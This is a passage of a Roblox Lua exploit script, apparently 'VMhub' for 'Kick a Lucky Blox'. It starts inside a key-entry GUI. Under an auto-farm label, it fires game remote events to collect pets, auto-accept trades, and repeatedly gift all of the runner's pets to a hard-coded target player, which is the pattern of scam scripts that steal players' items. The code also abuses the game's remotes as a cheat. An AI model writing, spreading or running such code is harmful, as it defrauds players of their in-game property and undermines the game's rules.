                textBox.Position = UDim2.new(0, 40 + (i % 2 == 0 and 5 or -5), 0, 110)
                task.wait(0.05)
            end
            textBox.Position = UDim2.new(0, 40, 0, 110)
        end
    end)

    -- Cho phép nhấn Enter để xác nhận
    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            confirmButton.MouseButton1Click:Fire()
        end
    end)

    -- Animation fade in
    mainFrame.BackgroundTransparency = 1
    for i = 1, 10 do
        mainFrame.BackgroundTransparency = 1 - (i / 10)
        bg.BackgroundTransparency = 0.5 + (1 - (i / 10)) * 0.5
        task.wait(0.03)
    end
    mainFrame.BackgroundTransparency = 0
    bg.BackgroundTransparency = 0.5

    -- Đưa textBox vào focus
    task.wait(0.1)
    textBox:CaptureFocus()
end

-- ===== SCRIPT CHÍNH =====
local CONFIG = {
    ENABLED = true,
    AUTO_COLLECT_PETS = true,
    COLLECT_INTERVAL = 5,
    TARGET_PLAYER = "username_here",
    AUTO_ACCEPT_TRADE = true,
    GIFT_ALL_PETS = true,
}

local function collectPets()
    if not CONFIG.AUTO_COLLECT_PETS or not CONFIG.ENABLED then return end
    
    local houseArea = workspace:FindFirstChild("House") or workspace:FindFirstChild("HouseInterior")
    if not houseArea then
        for _, obj in ipairs(workspace:GetChildren()) do
            if obj:IsA("Model") and (obj.Name:lower():find("pet") or obj.Name:lower():find("egg") or obj.Name:lower():find("chest")) then
                local success, result = pcall(function()
                    return Network.rev_S_Interact:InvokeServer(obj)
                end)
                if success then
                    print("Collected: " .. obj.Name)
                end
            end
        end
    else
        for _, obj in ipairs(houseArea:GetChildren()) do
            if obj:IsA("Model") and (obj.Name:lower():find("pet") or obj.Name:lower():find("egg") or obj.Name:lower():find("chest")) then
                local success, result = pcall(function()
                    return Network.rev_S_Interact:InvokeServer(obj)
                end)
                if success then
                    print("Collected: " .. obj.Name)
                end
            end
        end
    end
end

local function giftPets(targetPlayerName)
    if not CONFIG.ENABLED then return end
    
    local targetPlayer = Players:FindFirstChild(targetPlayerName)
    if not targetPlayer then
        warn("Target player not found: " .. targetPlayerName)
        return
    end
    
    local localPlayer = Players.LocalPlayer
    if not localPlayer then return end
    
    if CONFIG.GIFT_ALL_PETS then
        local args = {
            [1] = targetPlayer,
            [2] = "all",
            [3] = true,
        }
        
        local success, result = pcall(function()
            return Network.rev_GiftRequest:FireServer(unpack(args))
        end)
        
        if success then
            print("Gift sent to: " .. targetPlayerName)
        else
            warn("Failed to send gift: " .. tostring(result))
        end
    end
end

local function autoAcceptTrades()
    if not CONFIG.AUTO_ACCEPT_TRADE or not CONFIG.ENABLED then return end
    
    local function onTradeRequest(player, tradeInfo)
        print("Trade request from: " .. player.Name)
        
        local args = {
            [1] = player,
            [2] = true,
        }
        
        local success = pcall(function()
            return Network.rev_GiftRequest:FireServer(unpack(args))
        end)
        
        if success then
            print("Trade accepted from: " .. player.Name)
        end
    end
    
    local tradeEvent = Network:FindFirstChild("rev_GiftRequest")
    if tradeEvent and tradeEvent:IsA("RemoteEvent") then
        tradeEvent.OnClientEvent:Connect(function(...)
            local args = {...}
            if args[1] and typeof(args[1]) == "Instance" and args[1]:IsA("Player") then
                onTradeRequest(args[1], args)
            end
        end)
    end
end

local function mainScript()
    print("=== VMhub Script Activated ===")
    print("Kick a Lucky Blox - Auto Script Started")
    print("Target Player: " .. CONFIG.TARGET_PLAYER)
    
    autoAcceptTrades()
    
    while CONFIG.ENABLED and KEY_ENTERED do
        collectPets()
        wait(1)
        
        if CONFIG.TARGET_PLAYER ~= "username_here" then
            giftPets(CONFIG.TARGET_PLAYER)
        end
        
        wait(CONFIG.COLLECT_INTERVAL)
    end
end

